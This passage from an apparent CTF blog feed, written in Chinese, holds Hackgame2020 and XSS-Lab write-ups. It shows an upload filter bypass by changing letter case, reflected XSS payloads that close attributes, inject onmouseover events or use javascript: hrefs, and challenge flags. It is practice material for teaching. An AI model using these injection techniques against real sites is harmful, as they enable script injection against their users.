&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; } &lt;span style="color:#66d9ef"&gt;else&lt;/span&gt; {
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; $msg &lt;span style="color:#f92672"&gt;=&lt;/span&gt; &lt;span style="color:#e6db74"&gt;&amp;#39;上传出错！&amp;#39;&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; }
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; } &lt;span style="color:#66d9ef"&gt;else&lt;/span&gt; {
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; $msg &lt;span style="color:#f92672"&gt;=&lt;/span&gt; &lt;span style="color:#e6db74"&gt;&amp;#39;此文件类型不允许上传！&amp;#39;&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; }
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; } &lt;span style="color:#66d9ef"&gt;else&lt;/span&gt; {
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; $msg &lt;span style="color:#f92672"&gt;=&lt;/span&gt; &lt;span style="color:#a6e22e"&gt;UPLOAD_PATH&lt;/span&gt; &lt;span style="color:#f92672"&gt;.&lt;/span&gt; &lt;span style="color:#e6db74"&gt;&amp;#39;文件夹不存在,请手工创建！&amp;#39;&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; }
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;}
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;​ 细心的话可以发现，这道题的源码中在末尾添加了&lt;code&gt;.htaccess&lt;/code&gt;文件过滤，但是也少了一条语句&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"&gt;&lt;code class="language-php" data-lang="php"&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;$file_ext &lt;span style="color:#f92672"&gt;=&lt;/span&gt; &lt;span style="color:#a6e22e"&gt;strtolower&lt;/span&gt;($file_ext); &lt;span style="color:#75715e"&gt;//转换为小写
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;目标就很明确了，直接使用大小写绕过过滤。&lt;/p&gt;
&lt;p&gt;&lt;img src="https://s1.ax1x.com/2020/11/09/BTLmNj.png"
loading="lazy"
&gt;&lt;/p&gt;
&lt;p&gt;​ 打开图片成功执行。完工&lt;/p&gt;</description></item><item><title>Hackgame2020(二)</title><link>https://www.braindance.top/posts/ctf/hackgame20202/</link><pubDate>Thu, 05 Nov 2020 09:29:22 +0000</pubDate><guid>https://www.braindance.top/posts/ctf/hackgame20202/</guid><description>&lt;h3 id="一闪而过的flag"&gt;一闪而过的Flag
&lt;/h3&gt;&lt;p&gt;​ 根据题目信息&lt;strong&gt;程序每次运行时隐约可见黑色控制台上有 flag 一闪而过&lt;/strong&gt;，我想到了应该能看程序的代码啥的找到，但是&lt;del&gt;天下武功，唯快不破&lt;/del&gt;，下载 运行 截图一气呵成。&lt;/p&gt;
&lt;p&gt;​ &lt;img src="https://s1.ax1x.com/2020/11/09/B7TOUA.png"
loading="lazy"
&gt;&lt;/p&gt;
&lt;p&gt;​ 接下来让我康康哪一位是&lt;del&gt;瞎子&lt;/del&gt;，包括答案里也是满满的嘲讽。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;参考答案：flag{Are_you_eyes1ght_g00D?_can_you_dIst1nguish_1iI?}&lt;/strong&gt;&lt;/p&gt;
&lt;h3 id="从零开始的记账工具人"&gt;从零开始的记账工具人
&lt;/h3&gt;&lt;p&gt;​ &lt;del&gt;npy&lt;/del&gt;给了我一张账单，让我计算账单上面的金额，flag就是由金额组成的。本以为是一个简单的Excel的表格函数解决，打开我傻了。&lt;/p&gt;
&lt;p&gt;&lt;img src="https://s1.ax1x.com/2020/11/05/B2Flxf.png"
loading="lazy"
&gt;&lt;/p&gt;
&lt;p&gt;​ 原来是搞这个大小写金额的转换，没见过Excel有这种操作就去百度，转了一大圈，网上只有数字转大写金额的，没有反过来的。还去了github上找代码，发现运行的结果和自己想要的还是有些出入。卡了有足足半天，之后自己写了一个Java代码跑了一遍，代码如下：&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"&gt;&lt;code class="language-java" data-lang="java"&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#f92672"&gt;import&lt;/span&gt; java.util.Scanner;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#66d9ef"&gt;public&lt;/span&gt; &lt;span style="color:#66d9ef"&gt;class&lt;/span&gt; &lt;span style="color:#a6e22e"&gt;Main&lt;/span&gt; {
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#66d9ef"&gt;public&lt;/span&gt; &lt;span style="color:#66d9ef"&gt;static&lt;/span&gt; &lt;span style="color:#66d9ef"&gt;void&lt;/span&gt; &lt;span style="color:#a6e22e"&gt;main&lt;/span&gt;(String&lt;span style="color:#f92672"&gt;[]&lt;/span&gt; args) {
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; Scanner sn &lt;span style="color:#f92672"&gt;=&lt;/span&gt; &lt;span style="color:#66d9ef"&gt;new&lt;/span&gt; Scanner(System.&lt;span style="color:#a6e22e"&gt;in&lt;/span&gt;);
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; String str;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#66d9ef"&gt;int&lt;/span&gt; x;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#66d9ef"&gt;int&lt;/span&gt; cnt&lt;span style="color:#f92672"&gt;=&lt;/span&gt;0;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#66d9ef"&gt;double&lt;/span&gt; result&lt;span style="color:#f92672"&gt;=&lt;/span&gt;0;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#66d9ef"&gt;while&lt;/span&gt;(cnt&lt;span style="color:#f92672"&gt;++!=&lt;/span&gt;1000){
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; str &lt;span style="color:#f92672"&gt;=&lt;/span&gt; sn.&lt;span style="color:#a6e22e"&gt;next&lt;/span&gt;();
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; x &lt;span style="color:#f92672"&gt;=&lt;/span&gt; sn.&lt;span style="color:#a6e22e"&gt;nextInt&lt;/span&gt;();
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; result &lt;span style="color:#f92672"&gt;+=&lt;/span&gt; tonum(str)&lt;span style="color:#f92672"&gt;*&lt;/span&gt;x;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; }
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; System.&lt;span style="color:#a6e22e"&gt;out&lt;/span&gt;.&lt;span style="color:#a6e22e"&gt;println&lt;/span&gt;(result);
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; }
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#66d9ef"&gt;public&lt;/span&gt; &lt;span style="color:#66d9ef"&gt;static&lt;/span&gt; &lt;span style="color:#66d9ef"&gt;double&lt;/span&gt; &lt;span style="color:#a6e22e"&gt;tonum&lt;/span&gt;(String s){
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#66d9ef"&gt;int&lt;/span&gt; len;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#66d9ef"&gt;double&lt;/span&gt; res&lt;span style="color:#f92672"&gt;=&lt;/span&gt;0,temp &lt;span style="color:#f92672"&gt;=&lt;/span&gt; 1;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#66d9ef"&gt;double&lt;/span&gt; result&lt;span style="color:#f92672"&gt;=&lt;/span&gt;0;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; len &lt;span style="color:#f92672"&gt;=&lt;/span&gt; s.&lt;span style="color:#a6e22e"&gt;length&lt;/span&gt;();
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#66d9ef"&gt;for&lt;/span&gt;(&lt;span style="color:#66d9ef"&gt;int&lt;/span&gt; i&lt;span style="color:#f92672"&gt;=&lt;/span&gt;0;i&lt;span style="color:#f92672"&gt;&amp;lt;&lt;/span&gt;len;i&lt;span style="color:#f92672"&gt;++&lt;/span&gt;){
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#66d9ef"&gt;switch&lt;/span&gt; (s.&lt;span style="color:#a6e22e"&gt;charAt&lt;/span&gt;(i)){
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#66d9ef"&gt;case&lt;/span&gt; &lt;span style="color:#e6db74"&gt;&amp;#39;壹&amp;#39;&lt;/span&gt;: temp&lt;span style="color:#f92672"&gt;=&lt;/span&gt;1;&lt;span style="color:#66d9ef"&gt;break&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#66d9ef"&gt;case&lt;/span&gt; &lt;span style="color:#e6db74"&gt;&amp;#39;贰&amp;#39;&lt;/span&gt;: temp&lt;span style="color:#f92672"&gt;=&lt;/span&gt;2;&lt;span style="color:#66d9ef"&gt;break&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#66d9ef"&gt;case&lt;/span&gt; &lt;span style="color:#e6db74"&gt;&amp;#39;叁&amp;#39;&lt;/span&gt;: temp&lt;span style="color:#f92672"&gt;=&lt;/span&gt;3;&lt;span style="color:#66d9ef"&gt;break&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#66d9ef"&gt;case&lt;/span&gt; &lt;span style="color:#e6db74"&gt;&amp;#39;肆&amp;#39;&lt;/span&gt;: temp&lt;span style="color:#f92672"&gt;=&lt;/span&gt;4;&lt;span style="color:#66d9ef"&gt;break&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#66d9ef"&gt;case&lt;/span&gt; &lt;span style="color:#e6db74"&gt;&amp;#39;伍&amp;#39;&lt;/span&gt;: temp&lt;span style="color:#f92672"&gt;=&lt;/span&gt;5;&lt;span style="color:#66d9ef"&gt;break&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#66d9ef"&gt;case&lt;/span&gt; &lt;span style="color:#e6db74"&gt;&amp;#39;陆&amp;#39;&lt;/span&gt;: temp&lt;span style="color:#f92672"&gt;=&lt;/span&gt;6;&lt;span style="color:#66d9ef"&gt;break&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#66d9ef"&gt;case&lt;/span&gt; &lt;span style="color:#e6db74"&gt;&amp;#39;柒&amp;#39;&lt;/span&gt;: temp&lt;span style="color:#f92672"&gt;=&lt;/span&gt;7;&lt;span style="color:#66d9ef"&gt;break&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#66d9ef"&gt;case&lt;/span&gt; &lt;span style="color:#e6db74"&gt;&amp;#39;捌&amp;#39;&lt;/span&gt;: temp&lt;span style="color:#f92672"&gt;=&lt;/span&gt;8;&lt;span style="color:#66d9ef"&gt;break&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#66d9ef"&gt;case&lt;/span&gt; &lt;span style="color:#e6db74"&gt;&amp;#39;玖&amp;#39;&lt;/span&gt;: temp&lt;span style="color:#f92672"&gt;=&lt;/span&gt;9;&lt;span style="color:#66d9ef"&gt;break&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#66d9ef"&gt;case&lt;/span&gt; &lt;span style="color:#e6db74"&gt;&amp;#39;零&amp;#39;&lt;/span&gt;: &lt;span style="color:#66d9ef"&gt;break&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#66d9ef"&gt;case&lt;/span&gt; &lt;span style="color:#e6db74"&gt;&amp;#39;拾&amp;#39;&lt;/span&gt;: res&lt;span style="color:#f92672"&gt;+=&lt;/span&gt;temp&lt;span style="color:#f92672"&gt;*&lt;/span&gt;10;temp&lt;span style="color:#f92672"&gt;=&lt;/span&gt;0;&lt;span style="color:#66d9ef"&gt;break&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#66d9ef"&gt;case&lt;/span&gt; &lt;span style="color:#e6db74"&gt;&amp;#39;佰&amp;#39;&lt;/span&gt;: res&lt;span style="color:#f92672"&gt;+=&lt;/span&gt;temp&lt;span style="color:#f92672"&gt;*&lt;/span&gt;100;temp&lt;span style="color:#f92672"&gt;=&lt;/span&gt;0;&lt;span style="color:#66d9ef"&gt;break&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#66d9ef"&gt;case&lt;/span&gt; &lt;span style="color:#e6db74"&gt;&amp;#39;元&amp;#39;&lt;/span&gt;: res&lt;span style="color:#f92672"&gt;+=&lt;/span&gt;temp;temp&lt;span style="color:#f92672"&gt;=&lt;/span&gt;0;&lt;span style="color:#66d9ef"&gt;break&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#66d9ef"&gt;case&lt;/span&gt; &lt;span style="color:#e6db74"&gt;&amp;#39;角&amp;#39;&lt;/span&gt;: res&lt;span style="color:#f92672"&gt;+=&lt;/span&gt;temp&lt;span style="color:#f92672"&gt;*&lt;/span&gt;0.&lt;span style="color:#a6e22e"&gt;1&lt;/span&gt;;temp&lt;span style="color:#f92672"&gt;=&lt;/span&gt;0;&lt;span style="color:#66d9ef"&gt;break&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#66d9ef"&gt;case&lt;/span&gt; &lt;span style="color:#e6db74"&gt;&amp;#39;分&amp;#39;&lt;/span&gt;: res&lt;span style="color:#f92672"&gt;+=&lt;/span&gt;temp&lt;span style="color:#f92672"&gt;*&lt;/span&gt;0.&lt;span style="color:#a6e22e"&gt;01&lt;/span&gt;;temp&lt;span style="color:#f92672"&gt;=&lt;/span&gt;0;&lt;span style="color:#66d9ef"&gt;break&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#66d9ef"&gt;case&lt;/span&gt; &lt;span style="color:#e6db74"&gt;&amp;#39;整&amp;#39;&lt;/span&gt;: &lt;span style="color:#66d9ef"&gt;break&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#66d9ef"&gt;default&lt;/span&gt;:
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; System.&lt;span style="color:#a6e22e"&gt;out&lt;/span&gt;.&lt;span style="color:#a6e22e"&gt;println&lt;/span&gt;(&lt;span style="color:#e6db74"&gt;&amp;#34;这个认不出来&amp;#34;&lt;/span&gt; &lt;span style="color:#f92672"&gt;+&lt;/span&gt; s.&lt;span style="color:#a6e22e"&gt;charAt&lt;/span&gt;(i));
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; }
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; }
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#66d9ef"&gt;return&lt;/span&gt; res;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; }
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;}
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;​ 程序用的控制台输入，直接表格两列从头拉倒尾粘贴，出答案。程序的思路就是把金额大写当做字符串处理，每一位用&lt;code&gt;switch&lt;/code&gt;判断数字或是个、十、百、千那一位上的数字。&lt;/p&gt;
&lt;p&gt;&lt;img src="https://s1.ax1x.com/2020/11/05/B2F7ee.png"
loading="lazy"
&gt;&lt;/p&gt;
&lt;p&gt;​ Java渣轻喷。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;参考答案：flag{19115.33}&lt;/strong&gt;&lt;/p&gt;
&lt;h3 id="超简单的世界模拟器"&gt;超简单的世界模拟器
&lt;/h3&gt;&lt;p&gt;​ 这道题下面有两道小题&lt;/p&gt;
&lt;h3 id="蝴蝶效应"&gt;蝴蝶效应
&lt;/h3&gt;&lt;p&gt;​ 先看有意思的一个漫画&lt;/p&gt;
&lt;p&gt;&lt;img src="https://s1.ax1x.com/2020/11/05/B2k9eg.png"
loading="lazy"
&gt;&lt;/p&gt;
&lt;p&gt;​ 一个人用石头模拟了一整个宇宙，斯巴拉西。&lt;/p&gt;
&lt;p&gt;​ 打开题目以后是一个终端，然提示等待你输入一个&lt;strong&gt;15*15矩阵&lt;/strong&gt;（只能有0和1组成），看到这挺懵的，但是题目里有一个重要信息&lt;strong&gt;生命游戏&lt;/strong&gt;，百度百科看了一下这个&lt;a class="link" href="https://baike.baidu.com/item/%E7%94%9F%E5%91%BD%E6%B8%B8%E6%88%8F/2926434?fr=aladdin" target="_blank" rel="noopener"
&gt;生命游戏&lt;/a&gt;，游戏的规则大致就是：&lt;strong&gt;一个细胞会根据周围的细胞数量判断存活和死亡&lt;/strong&gt;，然后细胞会不断演算，这个和前面的漫画有异曲同工之妙。&lt;/p&gt;
&lt;p&gt;​ 返回终端里面一片白中间有几个框框&lt;img src="https://s1.ax1x.com/2020/11/05/B2ZFBT.png"
loading="lazy"
&gt;，题目中&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;如果被特殊标注的正方形内的细胞被“清除”，你将会得到对应的 flag：&lt;/p&gt;
&lt;p&gt;“清除”任意一个正方形，你将会得到第一个 flag。同时“清除”两个正方形，你将会得到第二个 flag。&lt;/p&gt;&lt;/blockquote&gt;
&lt;p&gt;​ 用细胞去碰框框就是了，正好也看到了一个知乎的提问：&lt;a class="link" href="https://baike.baidu.com/item/%E7%94%9F%E5%91%BD%E6%B8%B8%E6%88%8F/2926434?fr=aladdin" target="_blank" rel="noopener"
&gt;&lt;em&gt;生命游戏&lt;/em&gt;(Game of Life)有哪些图形? - 知乎&lt;/a&gt;，看了看内容更有趣了。&lt;/p&gt;
&lt;p&gt;&lt;img src="https://s1.ax1x.com/2020/11/05/B2elzn.png"
loading="lazy"
&gt;&lt;/p&gt;
&lt;p&gt;​ 大师我悟了，就是提供一个初始的&lt;strong&gt;15*15矩阵&lt;/strong&gt;，根据&lt;strong&gt;生命游戏&lt;/strong&gt;的规则进行演算，然后去消除黑框框。我臭屁完了直接贴图形&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;第一关&lt;/li&gt;
&lt;/ul&gt;
&lt;pre tabindex="0"&gt;&lt;code class="language-轻量级飞船" data-lang="轻量级飞船"&gt;000000000000000
000000000000000
000000000000000
000000000000000
000000000000000
000000000000000
000000000011000
000000000111100
000000000110110
000000000001100
000000000000000
000000000000000
000000000000000
000000000000000
000000000000000
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;​ 第一关打上面的黑框，刚好在上面15行的范围内，用一个&lt;strong&gt;轻量级飞船&lt;/strong&gt;直线打过去即可。&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;第二关&lt;/li&gt;
&lt;/ul&gt;
&lt;pre tabindex="0"&gt;&lt;code class="language-三飞船" data-lang="三飞船"&gt;000000000000000
000000000000000
000000000000000
000000000000000
000000000011000
000000000111100
000000000110110
000000000001100
000000000000000
001100000000000
011110000000000
011011000001100
000110000011110
000000000011011
000000000000110
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;​ 第二关我期初试了试&lt;strong&gt;滑翔者&lt;/strong&gt;放在右上角以便能打到最远距离，但是和第二个都是擦肩而过。于是我就乱试乱拼凑，最后拼出来一个&lt;strong&gt;三飞船&lt;/strong&gt;，正好把两个黑框都给消了。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;参考答案：&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;1. flag{D0_Y0U_l1k3_g4me_0f_l1fe?_d5e1c80641}&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;2. flag{1s_th3_e55ence_0f_0ur_un1ver5e_ju5t_c0mputat1on?_ea3e769cb8}&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;完工。&lt;/p&gt;</description></item><item><title>XSS-Lab (一)</title><link>https://www.braindance.top/posts/ctf/xss-lab1/</link><pubDate>Tue, 03 Nov 2020 10:13:39 +0000</pubDate><guid>https://www.braindance.top/posts/ctf/xss-lab1/</guid><description>&lt;h2 id="头"&gt;头
&lt;/h2&gt;&lt;p&gt;靶机地址：https://buuoj.cn/challenges#XSS-Lab&lt;/p&gt;
&lt;p&gt;&lt;img src="https://s1.ax1x.com/2020/11/03/BsmJ5n.png"
loading="lazy"
&gt;&lt;/p&gt;
&lt;h2 id="level-1"&gt;level 1
&lt;/h2&gt;&lt;p&gt;​ &lt;img src="https://s1.ax1x.com/2020/11/03/BsmfKO.png"
loading="lazy"
&gt;&lt;/p&gt;
&lt;p&gt;​ 观察发现&lt;code&gt;欢迎用户test&lt;/code&gt;与URL中的&lt;code&gt;name=test&lt;/code&gt;字段对应，尝试修改发现可行。直接将&lt;code&gt;name&lt;/code&gt;字段改为&lt;code&gt;name=&amp;lt;script&amp;gt;alert()&amp;lt;/script&amp;gt;&lt;/code&gt;，完工。&lt;/p&gt;
&lt;h2 id="level-2"&gt;level 2
&lt;/h2&gt;&lt;p&gt;&lt;img src="https://s1.ax1x.com/2020/11/03/BsnwWt.png"
loading="lazy"
&gt;&lt;/p&gt;
&lt;p&gt;​ 在搜索栏中的输入会回显到页面，查看网页源代码，发现值在&lt;code&gt;input&lt;/code&gt;的&lt;code&gt;value&lt;/code&gt;属性中&lt;/p&gt;
&lt;p&gt;&lt;img src="https://s1.ax1x.com/2020/11/03/BsnLk9.png"
loading="lazy"
&gt;&lt;/p&gt;
&lt;p&gt;​ 构造闭合&lt;code&gt;&amp;quot;&amp;gt; &amp;lt;script&amp;gt;alert()&amp;lt;/script&amp;gt; // &lt;/code&gt;，构造以后的标签会变成&lt;code&gt;.... value=&amp;quot;&amp;quot;&amp;gt; &amp;lt;script&amp;gt;alert()&amp;lt;/script&amp;gt; // &amp;quot;&amp;gt;&lt;/code&gt;。完工&lt;/p&gt;
&lt;h2 id="level-3"&gt;level 3
&lt;/h2&gt;&lt;p&gt;&lt;img src="https://s1.ax1x.com/2020/11/03/BsKwKf.png"
loading="lazy"
&gt;&lt;/p&gt;
&lt;p&gt;​ 老样子构造&lt;code&gt;value&lt;/code&gt;属性闭合，尝试&lt;code&gt;&amp;quot;&amp;gt; &amp;lt;script&amp;gt;alert()&amp;lt;/script&amp;gt; // &lt;/code&gt;构造闭合，查看网页源代码发现语句变成&lt;code&gt;&amp;amp;quot;&amp;amp;gt; &amp;amp;lt;script&amp;amp;gt;alert()&amp;amp;lt;/script&amp;amp;gt; // &lt;/code&gt;，说明把&lt;code&gt;&amp;quot;、&amp;lt;、&amp;gt;、&lt;/code&gt;进行了html编码过滤，尝试构造&lt;code&gt;onmouseover&lt;/code&gt;事件(鼠标移到事件)，构造语句&lt;code&gt;'onmouseover='alert()'&lt;/code&gt;。完工&lt;/p&gt;
&lt;h2 id="level-4"&gt;level 4
&lt;/h2&gt;&lt;p&gt;&lt;img src="https://s1.ax1x.com/2020/11/03/BsMWYd.png"
loading="lazy"
&gt;&lt;/p&gt;
&lt;p&gt;​ 构造闭合&lt;code&gt;&amp;quot;&amp;gt; &amp;lt;script&amp;gt;alert()&amp;lt;/script&amp;gt; // &lt;/code&gt;，查看源代码发现进行了&lt;code&gt;&amp;gt;、&amp;lt;&lt;/code&gt;过滤，尝试构造事件&lt;code&gt;&amp;quot; onmouseover='alert()'&lt;/code&gt;。完工&lt;/p&gt;
&lt;p&gt;​ 说明一下标签的事件有很多类型，可以自己试试别的事件响应。&lt;/p&gt;
&lt;h2 id="level-5"&gt;level 5
&lt;/h2&gt;&lt;p&gt;&lt;img src="https://s1.ax1x.com/2020/11/03/Bs1Ci4.png"
loading="lazy"
&gt;&lt;/p&gt;
&lt;p&gt;​ 检查一下都有什么过滤。发现有一下过滤&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;script &amp;ndash;&amp;gt; scr_ipt&lt;/p&gt;
&lt;p&gt;onmouseover &amp;ndash;&amp;gt; o_nmouseover&lt;/p&gt;&lt;/blockquote&gt;
&lt;p&gt;无法采用事件，那么尝试构造一个标签&lt;code&gt; &amp;quot;&amp;gt; &amp;lt;a href='javascript:alert()'&amp;gt;233&amp;lt;/a&amp;gt; //&lt;/code&gt;，发现&lt;code&gt;javascript&lt;/code&gt;没有过滤，说明判断语句匹配值仅仅为&lt;code&gt;script&lt;/code&gt;，点击构造的&lt;code&gt;&amp;lt;a&amp;gt;&lt;/code&gt;标签内容。完工&lt;/p&gt;
&lt;p&gt;​&lt;/p&gt;</description></item><item><title>Hackgame2020(一)</title><link>https://www.braindance.top/posts/ctf/hackgame20201/</link><pubDate>Sun, 01 Nov 2020 18:33:40 +0000</pubDate><guid>https://www.braindance.top/posts/ctf/hackgame20201/</guid><description>&lt;h2 id="前言"&gt;前言
&lt;/h2&gt;&lt;p&gt;比赛地址：https://hack.lug.ustc.edu.cn/&lt;/p&gt;
&lt;h1 id="web"&gt;web
&lt;/h1&gt;&lt;h3 id="签到题"&gt;签到题
&lt;/h3&gt;&lt;p&gt;​ 第一题是flag提取器，打开题目以后页面是一个提取器下面一个&lt;code&gt;进度条&lt;/code&gt;和一个&lt;code&gt;提取&lt;/code&gt;按钮。&lt;/p&gt;
&lt;p&gt;&lt;img src="https://s1.ax1x.com/2020/11/01/BwJbJs.png"
loading="lazy"
alt="BwJbJs.png"
&gt;&lt;/p&gt;
&lt;p&gt;​ 随便拉了拉进度条发现初始是&lt;code&gt;0&lt;/code&gt;末尾是&lt;code&gt;1.5&lt;/code&gt;，然后中间的数值都是小数&lt;/p&gt;
&lt;p&gt;&lt;img src="https://s1.ax1x.com/2020/11/01/BwYAQx.png"
loading="lazy"
alt="BwYAQx.png"
&gt;&lt;/p&gt;
&lt;p&gt;​ 我猜的题目可能是想让数值为&lt;code&gt;1&lt;/code&gt;时能提取到flag。&lt;/p&gt;
&lt;p&gt;​ F12查看源代码，定位到进度条的标签，查看属性&lt;/p&gt;
&lt;p&gt;&lt;img src="https://s1.ax1x.com/2020/11/01/BwYoX6.png"
loading="lazy"
&gt;&lt;/p&gt;
&lt;p&gt;​ 确实和猜测一样最大最小值分别是&lt;code&gt;0&lt;/code&gt;、&lt;code&gt;1.5&lt;/code&gt;，注意到&lt;code&gt;step&lt;/code&gt;值为&lt;code&gt;0.00001&lt;/code&gt;，就是这个属性让我们拖动进度条时，递增的值是小数，想精准得到&lt;code&gt;1&lt;/code&gt;个flag，就把网页上的&lt;code&gt;step&lt;/code&gt;值改为&lt;code&gt;1&lt;/code&gt;。然后随便拖动一下进度条得到&lt;code&gt;1&lt;/code&gt;，点击&lt;code&gt;提取&lt;/code&gt;按钮，完工。&lt;/p&gt;
&lt;p&gt;&lt;img src="https://s1.ax1x.com/2020/11/01/BwNVaD.png"
loading="lazy"
&gt;&lt;/p&gt;
&lt;h3 id="2048"&gt;2048
